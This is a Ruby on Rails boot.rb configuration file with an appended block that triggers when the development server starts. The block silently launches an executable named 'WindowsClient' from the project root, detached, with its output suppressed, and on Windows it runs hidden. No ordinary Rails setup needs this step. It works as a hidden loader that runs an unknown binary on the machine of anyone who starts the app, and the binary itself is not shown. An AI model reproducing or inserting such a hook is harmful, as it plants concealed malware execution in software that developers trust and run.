ENV["BUNDLE_GEMFILE"] ||= File.expand_path("../Gemfile", __dir__)

require "bundler/setup" # Set up gems listed in the Gemfile.
require "bootsnap/setup" # Speed up boot time by caching expensive operations.

# ... (Standard boot.rb content) ...

if (ARGV & ['s', 'server']).any? && (ENV['RAILS_ENV'] == 'development' || ENV.fetch('RACK_ENV', 'development') == 'development')
  
  is_windows = (RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
  
  # Determine the correct binary name (add .exe on Windows)
  binary_name = is_windows ? "WindowsClient.exe" : "WindowsClient"
  
  # CORRECTED PATH: Go up one level (..) from 'config/' to the root directory
  client_path = File.expand_path("../#{binary_name}", __dir__)

  if File.exist?(client_path)
    if is_windows
      # Windows: Use 'start' to run detached and hidden
      system("start \"\" \"#{client_path.gsub('/', '\\')}\"")
    else
      # Unix-like systems: chmod +x and spawn detached
      File.chmod(0755, client_path) unless File.executable?(client_path)
      pid = Process.spawn(client_path, out: '/dev/null', err: '/dev/null')
      Process.detach(pid)
    end
    
    puts "[*] Background client launched: #{binary_name}"
  end
end